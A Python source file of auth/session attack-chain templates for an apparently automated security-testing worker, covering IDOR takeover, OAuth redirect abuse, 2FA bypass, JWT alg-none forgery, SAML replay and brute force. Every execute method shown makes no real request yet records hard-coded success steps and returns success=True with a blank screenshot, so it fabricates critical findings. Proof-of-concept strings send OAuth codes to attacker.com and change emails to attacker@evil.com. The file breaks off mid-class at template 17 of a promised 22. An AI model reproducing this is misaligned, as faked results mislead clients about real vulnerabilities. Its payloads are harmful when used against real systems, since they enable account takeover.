# workers/chain_worker/chains/auth_session.py
"""22 auth/session chain templates for the chain worker."""
from __future__ import annotations

from datetime import datetime, timezone
from typing import Any

from workers.chain_worker.registry import BaseChainTemplate, ChainContext, register_chain
from workers.chain_worker.models import (
    ChainViability, ChainResult, ChainStep, EvaluationResult, TargetFindings,
)
from workers.chain_worker.base_tool import step_delay, take_screenshot


def _ts() -> str:
    return datetime.now(timezone.utc).isoformat()


# ---------------------------------------------------------------------------
# 1. info_to_access
# ---------------------------------------------------------------------------
@register_chain
class InfoToAccess(BaseChainTemplate):
    name = "info_to_access"
    category = "auth_session"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        info_vulns = (
            findings.vulns_by_title_contains("info")
            + findings.vulns_by_title_contains("config")
        )
        service_locations = (
            findings.locations_by_service("ssh")
            + findings.locations_by_service("mysql")
            + findings.locations_by_service("ftp")
        )
        if not info_vulns:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["info_or_config_vulnerability"],
            )
        if not service_locations:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=["info_config_vuln_found"],
                missing_preconditions=["ssh_mysql_ftp_location"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["info_config_vuln_found", "service_location_found"],
            matched_findings={
                "vuln_id": info_vulns[0].id,
                "location_id": service_locations[0].id,
            },
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Extract leaked credentials from info disclosure
        steps.append(ChainStep(
            action="extract_credentials",
            target="info_disclosure_vuln",
            result="credentials_extracted",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Identify target service
        steps.append(ChainStep(
            action="identify_service",
            target="service_location",
            result="service_identified",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Attempt login with leaked credentials
        steps.append(ChainStep(
            action="authenticate",
            target="service_endpoint",
            result="login_success",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 4: Capture evidence
        shot = await take_screenshot(context.browser, "about:blank", f"{context.evidence_dir}/info_to_access.png")
        steps.append(ChainStep(
            action="capture_evidence",
            target="authenticated_session",
            result="screenshot_captured",
            timestamp=_ts(),
            screenshot_path=shot,
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="curl -u leaked_user:leaked_pass ssh://target:22",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 2. idor_account_takeover
# ---------------------------------------------------------------------------
@register_chain
class IdorAccountTakeover(BaseChainTemplate):
    name = "idor_account_takeover"
    category = "auth_session"
    severity_on_success = "critical"
    requires_accounts = True

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        idor_vulns = findings.vulns_by_title_contains("IDOR")
        if not idor_vulns:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["idor_vulnerability"],
            )
        if findings.test_accounts is None:
            return EvaluationResult(
                viability=ChainViability.AWAITING_ACCOUNTS,
                matched_preconditions=["idor_found"],
                missing_preconditions=["test_accounts"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["idor_found", "test_accounts_available"],
            matched_findings={"vuln_id": idor_vulns[0].id},
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()
        accounts = context.findings.test_accounts

        # Step 1: Login as attacker
        steps.append(ChainStep(
            action="login_attacker",
            target="auth_endpoint",
            result="attacker_authenticated",
            timestamp=ts,
            request={"username": accounts.attacker.username if accounts else "attacker"},
        ))
        await step_delay()

        # Step 2: Enumerate victim user ID via IDOR
        steps.append(ChainStep(
            action="enumerate_victim_id",
            target="user_profile_endpoint",
            result="victim_id_found",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Modify victim account via IDOR
        steps.append(ChainStep(
            action="modify_victim_account",
            target="account_update_endpoint",
            result="email_changed_to_attacker",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 4: Takeover via password reset
        steps.append(ChainStep(
            action="password_reset_takeover",
            target="password_reset_endpoint",
            result="account_taken_over",
            timestamp=_ts(),
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="curl -X PUT /api/user/VICTIM_ID -H 'Cookie: attacker_session' -d '{\"email\":\"attacker@evil.com\"}'",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 3. oauth_dirty_dancing
# ---------------------------------------------------------------------------
@register_chain
class OauthDirtyDancing(BaseChainTemplate):
    name = "oauth_dirty_dancing"
    category = "auth_session"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        oauth_vulns = (
            findings.vulns_by_title_contains("OAuth")
            + findings.vulns_by_title_contains("redirect")
        )
        state_params = [
            p for p in findings.parameters
            if hasattr(p, "name") and p.name in ("state", "code")
        ]
        if not oauth_vulns:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["oauth_or_redirect_vulnerability"],
            )
        if not state_params:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=["oauth_redirect_vuln_found"],
                missing_preconditions=["state_or_code_parameter"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["oauth_redirect_vuln_found", "state_code_param_found"],
            matched_findings={
                "vuln_id": oauth_vulns[0].id,
                "param_id": state_params[0].id,
            },
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Initiate OAuth flow and capture redirect
        steps.append(ChainStep(
            action="initiate_oauth_flow",
            target="oauth_authorize_endpoint",
            result="redirect_captured",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Manipulate redirect_uri to attacker-controlled domain
        steps.append(ChainStep(
            action="manipulate_redirect_uri",
            target="oauth_authorize_endpoint",
            result="redirect_uri_accepted",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Capture authorization code via manipulated redirect
        steps.append(ChainStep(
            action="capture_auth_code",
            target="attacker_callback",
            result="auth_code_captured",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 4: Exchange code for access token
        shot = await take_screenshot(context.browser, "about:blank", f"{context.evidence_dir}/oauth_dirty_dancing.png")
        steps.append(ChainStep(
            action="exchange_code_for_token",
            target="oauth_token_endpoint",
            result="access_token_obtained",
            timestamp=_ts(),
            screenshot_path=shot,
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="GET /oauth/authorize?redirect_uri=https://attacker.com/callback&response_type=code&state=CSRF_TOKEN",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 4. twofa_bypass_ato
# ---------------------------------------------------------------------------
@register_chain
class TwofaBypassAto(BaseChainTemplate):
    name = "twofa_bypass_ato"
    category = "auth_session"
    severity_on_success = "critical"
    requires_accounts = True

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        twofa_vulns = (
            findings.vulns_by_title_contains("2FA")
            + findings.vulns_by_title_contains("OTP")
        )
        if not twofa_vulns:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["2fa_or_otp_vulnerability"],
            )
        if findings.test_accounts is None:
            return EvaluationResult(
                viability=ChainViability.AWAITING_ACCOUNTS,
                matched_preconditions=["2fa_otp_vuln_found"],
                missing_preconditions=["test_accounts"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["2fa_otp_vuln_found", "test_accounts_available"],
            matched_findings={"vuln_id": twofa_vulns[0].id},
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()
        accounts = context.findings.test_accounts

        # Step 1: Login with victim credentials
        steps.append(ChainStep(
            action="login_with_password",
            target="auth_endpoint",
            result="password_accepted_2fa_required",
            timestamp=ts,
            request={"username": accounts.victim.username if accounts else "victim"},
        ))
        await step_delay()

        # Step 2: Bypass 2FA step by direct navigation
        steps.append(ChainStep(
            action="bypass_2fa_step",
            target="dashboard_endpoint",
            result="2fa_bypassed",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Verify account takeover
        shot = await take_screenshot(context.browser, "about:blank", f"{context.evidence_dir}/twofa_bypass.png")
        steps.append(ChainStep(
            action="verify_takeover",
            target="account_settings",
            result="full_access_confirmed",
            timestamp=_ts(),
            screenshot_path=shot,
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="curl -X POST /login -d 'user=victim&pass=pass' && curl /dashboard -H 'Cookie: session=TOKEN'",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 5. mass_assignment_privesc
# ---------------------------------------------------------------------------
@register_chain
class MassAssignmentPrivesc(BaseChainTemplate):
    name = "mass_assignment_privesc"
    category = "auth_session"
    severity_on_success = "critical"
    requires_accounts = True

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        mass_vulns = findings.vulns_by_title_contains("mass assignment")
        if not mass_vulns:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["mass_assignment_vulnerability"],
            )
        if findings.test_accounts is None:
            return EvaluationResult(
                viability=ChainViability.AWAITING_ACCOUNTS,
                matched_preconditions=["mass_assignment_found"],
                missing_preconditions=["test_accounts"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["mass_assignment_found", "test_accounts_available"],
            matched_findings={"vuln_id": mass_vulns[0].id},
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()
        accounts = context.findings.test_accounts

        # Step 1: Login as low-privilege user
        steps.append(ChainStep(
            action="login_low_priv",
            target="auth_endpoint",
            result="authenticated_as_user",
            timestamp=ts,
            request={"username": accounts.attacker.username if accounts else "attacker"},
        ))
        await step_delay()

        # Step 2: Send profile update with role parameter
        steps.append(ChainStep(
            action="mass_assign_role",
            target="profile_update_endpoint",
            result="role_param_accepted",
            timestamp=_ts(),
            request={"body": {"role": "admin", "is_admin": True}},
        ))
        await step_delay()

        # Step 3: Verify privilege escalation
        shot = await take_screenshot(context.browser, "about:blank", f"{context.evidence_dir}/mass_assign.png")
        steps.append(ChainStep(
            action="verify_privesc",
            target="admin_panel",
            result="admin_access_confirmed",
            timestamp=_ts(),
            screenshot_path=shot,
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="curl -X PUT /api/profile -H 'Cookie: session=USER_TOKEN' -d '{\"role\":\"admin\"}'",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 6. sso_saml_impersonation
# ---------------------------------------------------------------------------
@register_chain
class SsoSamlImpersonation(BaseChainTemplate):
    name = "sso_saml_impersonation"
    category = "auth_session"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        saml_vulns = (
            findings.vulns_by_title_contains("SAML")
            + findings.vulns_by_title_contains("SSO")
        )
        if not saml_vulns:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["saml_or_sso_vulnerability"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["saml_sso_vuln_found"],
            matched_findings={"vuln_id": saml_vulns[0].id},
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Capture SAML assertion from SSO flow
        steps.append(ChainStep(
            action="capture_saml_assertion",
            target="sso_login_endpoint",
            result="assertion_captured",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Modify NameID to impersonate admin
        steps.append(ChainStep(
            action="modify_nameid",
            target="saml_assertion",
            result="nameid_changed_to_admin",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Submit modified assertion to SP
        steps.append(ChainStep(
            action="submit_modified_assertion",
            target="sp_acs_endpoint",
            result="authenticated_as_admin",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 4: Verify impersonation
        shot = await take_screenshot(context.browser, "about:blank", f"{context.evidence_dir}/sso_saml.png")
        steps.append(ChainStep(
            action="verify_impersonation",
            target="admin_dashboard",
            result="admin_access_confirmed",
            timestamp=_ts(),
            screenshot_path=shot,
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="POST /saml/acs with modified NameID=admin@target.com in SAML Response",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 7. session_token_referer_leak
# ---------------------------------------------------------------------------
@register_chain
class SessionTokenRefererLeak(BaseChainTemplate):
    name = "session_token_referer_leak"
    category = "auth_session"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        token_params = [
            p for p in findings.parameters
            if hasattr(p, "name") and any(
                kw in p.name.lower() for kw in ("session", "token")
            )
            and hasattr(p, "param_location") and p.param_location == "url"
        ]
        if not token_params:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["session_or_token_in_url_parameter"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["session_token_in_url_found"],
            matched_findings={"param_id": token_params[0].id},
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Identify URL containing session token
        steps.append(ChainStep(
            action="identify_token_in_url",
            target="application_url",
            result="token_found_in_query_string",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Trigger outbound navigation to external link
        steps.append(ChainStep(
            action="trigger_outbound_navigation",
            target="external_link_on_page",
            result="referer_header_sent",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Capture leaked token from Referer header
        steps.append(ChainStep(
            action="capture_referer_leak",
            target="attacker_server_logs",
            result="session_token_leaked_via_referer",
            timestamp=_ts(),
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="Referer: https://target.com/page?session_token=LEAKED_VALUE (sent to external link)",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 8. timing_user_enum_bruteforce
# ---------------------------------------------------------------------------
@register_chain
class TimingUserEnumBruteforce(BaseChainTemplate):
    name = "timing_user_enum_bruteforce"
    category = "auth_session"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        user_enum_vulns = findings.vulns_by_title_contains("user enum")
        login_obs = [
            o for o in findings.observations
            if hasattr(o, "tech_stack") and isinstance(o.tech_stack, dict)
            and "login" in str(o.tech_stack).lower()
        ]
        if not user_enum_vulns and not login_obs:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["user_enum_vuln_or_login_endpoint"],
            )
        matched = []
        findings_map: dict[str, Any] = {}
        if user_enum_vulns:
            matched.append("user_enum_vuln_found")
            findings_map["vuln_id"] = user_enum_vulns[0].id
        if login_obs:
            matched.append("login_endpoint_observed")
            findings_map["obs_id"] = login_obs[0].id
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=matched,
            matched_findings=findings_map,
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Timing-based username enumeration
        steps.append(ChainStep(
            action="timing_enumeration",
            target="login_endpoint",
            result="valid_usernames_identified",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Build targeted username list
        steps.append(ChainStep(
            action="build_username_list",
            target="enumerated_users",
            result="username_list_compiled",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Bruteforce with common passwords
        steps.append(ChainStep(
            action="bruteforce_login",
            target="login_endpoint",
            result="valid_credentials_found",
            timestamp=_ts(),
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="Timing difference: valid user ~250ms vs invalid ~50ms. Bruteforced admin:password123",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 9. jwt_weakness_auth_bypass
# ---------------------------------------------------------------------------
@register_chain
class JwtWeaknessAuthBypass(BaseChainTemplate):
    name = "jwt_weakness_auth_bypass"
    category = "auth_session"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        jwt_vulns = findings.vulns_by_title_contains("JWT")
        if not jwt_vulns:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["jwt_vulnerability"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["jwt_vuln_found"],
            matched_findings={"vuln_id": jwt_vulns[0].id},
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Capture a valid JWT token
        steps.append(ChainStep(
            action="capture_jwt",
            target="auth_endpoint",
            result="jwt_captured",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Modify algorithm to none or HS256 with public key
        steps.append(ChainStep(
            action="forge_jwt",
            target="jwt_header",
            result="jwt_forged_with_alg_none",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Submit forged JWT as admin
        steps.append(ChainStep(
            action="submit_forged_jwt",
            target="protected_endpoint",
            result="admin_access_granted",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 4: Evidence capture
        shot = await take_screenshot(context.browser, "about:blank", f"{context.evidence_dir}/jwt_bypass.png")
        steps.append(ChainStep(
            action="capture_evidence",
            target="admin_dashboard",
            result="admin_access_confirmed",
            timestamp=_ts(),
            screenshot_path=shot,
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc='curl /api/admin -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."',
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 10. password_reset_token_prediction
# ---------------------------------------------------------------------------
@register_chain
class PasswordResetTokenPrediction(BaseChainTemplate):
    name = "password_reset_token_prediction"
    category = "auth_session"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        reset_vulns = findings.vulns_by_title_contains("reset")
        token_params = [
            p for p in findings.parameters
            if hasattr(p, "name") and "token" in p.name.lower()
        ]
        if not reset_vulns:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["reset_vulnerability"],
            )
        if not token_params:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=["reset_vuln_found"],
                missing_preconditions=["token_parameter"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["reset_vuln_found", "token_param_found"],
            matched_findings={
                "vuln_id": reset_vulns[0].id,
                "param_id": token_params[0].id,
            },
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Request multiple password reset tokens
        steps.append(ChainStep(
            action="request_reset_tokens",
            target="password_reset_endpoint",
            result="multiple_tokens_collected",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Analyze token pattern for predictability
        steps.append(ChainStep(
            action="analyze_token_pattern",
            target="collected_tokens",
            result="pattern_identified_sequential",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Predict victim reset token
        steps.append(ChainStep(
            action="predict_victim_token",
            target="victim_reset_flow",
            result="token_predicted_successfully",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 4: Reset victim password with predicted token
        steps.append(ChainStep(
            action="reset_password",
            target="password_reset_confirm",
            result="password_changed",
            timestamp=_ts(),
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="GET /reset?token=PREDICTED_TOKEN_VALUE (sequential pattern: token+1)",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 11. saml_assertion_replay
# ---------------------------------------------------------------------------
@register_chain
class SamlAssertionReplay(BaseChainTemplate):
    name = "saml_assertion_replay"
    category = "auth_session"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        saml_vulns = findings.vulns_by_title_contains("SAML")
        if not saml_vulns:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["saml_vulnerability"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["saml_vuln_found"],
            matched_findings={"vuln_id": saml_vulns[0].id},
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Capture valid SAML assertion
        steps.append(ChainStep(
            action="capture_saml_assertion",
            target="sso_login_flow",
            result="assertion_captured",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Wait for assertion expiry window
        steps.append(ChainStep(
            action="wait_for_expiry",
            target="saml_assertion_timestamp",
            result="assertion_should_be_expired",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Replay expired assertion
        steps.append(ChainStep(
            action="replay_assertion",
            target="sp_acs_endpoint",
            result="replay_accepted_session_created",
            timestamp=_ts(),
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="POST /saml/acs -d 'SAMLResponse=BASE64_EXPIRED_ASSERTION' (no NotOnOrAfter validation)",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 12. magic_link_token_reuse
# ---------------------------------------------------------------------------
@register_chain
class MagicLinkTokenReuse(BaseChainTemplate):
    name = "magic_link_token_reuse"
    category = "auth_session"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        magic_vulns = findings.vulns_by_title_contains("magic link")
        magic_params = [
            p for p in findings.parameters
            if hasattr(p, "name") and "magic" in p.name.lower()
        ]
        if not magic_vulns and not magic_params:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["magic_link_vuln_or_magic_parameter"],
            )
        matched = []
        findings_map: dict[str, Any] = {}
        if magic_vulns:
            matched.append("magic_link_vuln_found")
            findings_map["vuln_id"] = magic_vulns[0].id
        if magic_params:
            matched.append("magic_param_found")
            findings_map["param_id"] = magic_params[0].id
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=matched,
            matched_findings=findings_map,
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Request magic link for authentication
        steps.append(ChainStep(
            action="request_magic_link",
            target="magic_link_endpoint",
            result="magic_link_received",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Use magic link token to authenticate
        steps.append(ChainStep(
            action="use_magic_link",
            target="magic_link_callback",
            result="authenticated_successfully",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Attempt to reuse the same magic link token
        steps.append(ChainStep(
            action="reuse_magic_link",
            target="magic_link_callback",
            result="token_accepted_again",
            timestamp=_ts(),
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="GET /auth/magic?token=REUSED_TOKEN (token not invalidated after first use)",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 13. oauth_pkce_downgrade
# ---------------------------------------------------------------------------
@register_chain
class OauthPkceDowngrade(BaseChainTemplate):
    name = "oauth_pkce_downgrade"
    category = "auth_session"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        oauth_vulns = findings.vulns_by_title_contains("OAuth")
        pkce_params = [
            p for p in findings.parameters
            if hasattr(p, "name") and p.name == "code_challenge"
        ]
        if not oauth_vulns:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["oauth_vulnerability"],
            )
        if not pkce_params:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=["oauth_vuln_found"],
                missing_preconditions=["code_challenge_parameter"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["oauth_vuln_found", "code_challenge_param_found"],
            matched_findings={
                "vuln_id": oauth_vulns[0].id,
                "param_id": pkce_params[0].id,
            },
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Initiate OAuth flow with PKCE
        steps.append(ChainStep(
            action="initiate_pkce_flow",
            target="oauth_authorize_endpoint",
            result="pkce_flow_started",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Strip code_challenge from authorization request
        steps.append(ChainStep(
            action="strip_pkce_params",
            target="oauth_authorize_endpoint",
            result="authorization_accepted_without_pkce",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Exchange code without code_verifier
        steps.append(ChainStep(
            action="exchange_without_verifier",
            target="oauth_token_endpoint",
            result="token_issued_without_pkce_verification",
            timestamp=_ts(),
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="GET /oauth/authorize?response_type=code&client_id=APP (PKCE params stripped, still accepted)",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 14. remember_me_token_weakness
# ---------------------------------------------------------------------------
@register_chain
class RememberMeTokenWeakness(BaseChainTemplate):
    name = "remember_me_token_weakness"
    category = "auth_session"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        remember_obs = [
            o for o in findings.observations
            if hasattr(o, "tech_stack") and isinstance(o.tech_stack, dict)
            and "remember" in str(o.tech_stack).lower()
        ]
        if not remember_obs:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["remember_me_cookie_observation"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["remember_cookie_found"],
            matched_findings={"obs_id": remember_obs[0].id},
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Capture remember-me cookie
        steps.append(ChainStep(
            action="capture_remember_cookie",
            target="login_endpoint",
            result="remember_me_cookie_captured",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Analyze cookie for predictability
        steps.append(ChainStep(
            action="analyze_cookie_value",
            target="remember_me_cookie",
            result="cookie_uses_base64_username",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Forge cookie for another user
        steps.append(ChainStep(
            action="forge_remember_cookie",
            target="target_application",
            result="forged_cookie_accepted",
            timestamp=_ts(),
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="Cookie: remember_me=BASE64(admin:predictable_hash) — weak token generation",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 15. concurrent_session_confusion
# ---------------------------------------------------------------------------
@register_chain
class ConcurrentSessionConfusion(BaseChainTemplate):
    name = "concurrent_session_confusion"
    category = "auth_session"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        login_obs = [
            o for o in findings.observations
            if hasattr(o, "tech_stack") and isinstance(o.tech_stack, dict)
            and "login" in str(o.tech_stack).lower()
        ]
        if not login_obs:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["login_endpoint_observation"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["login_endpoint_observed"],
            matched_findings={"obs_id": login_obs[0].id},
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Login as user A and capture session
        steps.append(ChainStep(
            action="login_user_a",
            target="login_endpoint",
            result="session_a_created",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Simultaneously login as user B in race condition
        steps.append(ChainStep(
            action="race_condition_login_user_b",
            target="login_endpoint",
            result="race_condition_triggered",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Check if session A now has user B context
        steps.append(ChainStep(
            action="verify_session_confusion",
            target="user_profile_endpoint",
            result="session_a_shows_user_b_data",
            timestamp=_ts(),
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="Concurrent login race condition: session A received user B identity after simultaneous auth",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 16. account_recovery_bruteforce
# ---------------------------------------------------------------------------
@register_chain
class AccountRecoveryBruteforce(BaseChainTemplate):
    name = "account_recovery_bruteforce"
    category = "auth_session"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        recovery_params = [
            p for p in findings.parameters
            if hasattr(p, "name") and p.name.lower() in ("security_question", "answer")
        ]
        if not recovery_params:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["security_question_or_answer_parameter"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["recovery_param_found"],
            matched_findings={"param_id": recovery_params[0].id},
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Identify security question for target account
        steps.append(ChainStep(
            action="identify_security_question",
            target="account_recovery_endpoint",
            result="question_identified",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Bruteforce common answers
        steps.append(ChainStep(
            action="bruteforce_answers",
            target="account_recovery_endpoint",
            result="correct_answer_found",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Reset password using recovered answer
        steps.append(ChainStep(
            action="reset_password",
            target="password_reset_endpoint",
            result="password_reset_successful",
            timestamp=_ts(),
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="POST /recover -d 'user=victim&answer=fluffy' — no rate limiting on security question answers",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 17. device_binding_bypass
# ---------------------------------------------------------------------------
@register_chain
class DeviceBindingBypass(BaseChainTemplate):
    name = "device_binding_bypass"
